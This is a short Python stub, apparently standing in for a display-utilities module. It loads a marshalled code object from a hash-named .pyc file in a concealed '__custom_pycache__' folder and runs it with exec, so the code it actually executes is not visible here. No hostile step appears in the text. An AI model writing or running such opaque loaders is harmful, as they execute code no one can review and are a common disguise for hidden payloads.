
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'display_utils_86a73d4f810540b38c20dd6b4e13dd48.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
